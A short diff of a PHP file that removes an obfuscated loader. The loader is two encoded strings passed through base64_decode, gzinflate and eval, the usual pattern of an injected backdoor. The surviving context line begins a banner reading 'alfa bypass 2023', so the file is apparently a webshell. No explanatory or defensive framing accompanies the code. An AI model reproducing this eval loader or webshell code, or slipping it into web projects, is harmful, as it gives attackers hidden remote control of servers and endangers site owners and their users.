@@ -1,9 +1,4 @@
-<?php
-$Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUPHJrNBE\x41tY\x41";
-$Lix = "iYK9Vitn5k4QX\x43\x636F\x2bo36\x43w/8k5v0Ok/T\x2bqswhLiS\x43EuXfuOlQqON\x42mQfD\x62UEtVMGy\x62lMSe\x42h\x42/\x63KToqiGsveh7\x63uHhwdpm0QXyWmglsLtGpwmnsWg38vT8EPqf6JKyyZDD9W5wIgLezP\x43EGSwxP5\x43R\x61IoL\x62LxolNjqZtNo\x61On\x2bh8Ov16T5W1\x426YLU3IS5soUpeOS9qS7/o\x2b/\x2b\x41Ph1\x42FN\x61L\x43tTzGOU\x43VHo\x63446XxqoYWfGqwSJ\x62Ug2mQd1P6VU9g\x62OhJRp431yO6RX7\x61U02QW\x63H68nYkJw0NrknzVOhTNyF3uMqu0Vy\x61ouL7\x42mn\x41zOUo\x63NLVqjJv/2Q40MPMP/\x42vN0zTYFrVv9K7FiZ2tGp\x41mtMJyKiHK0kI2HzH1umE\x61L1WR1iNRE2h\x2bX47G\x43\x42Q\x43vWTQ2o/eHQI\x42wJe\x2bPd\x41sEg/OHQM\x42wJe\x2bP\x63\x418Eg/\x2bGQQ\x42wJe\x2bP\x62\x41MFg/uGQU\x42wJe";
-eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
-exit;
-?>
+
 <?php
 /*   ___________________
     |  alfa bypass 2023   |
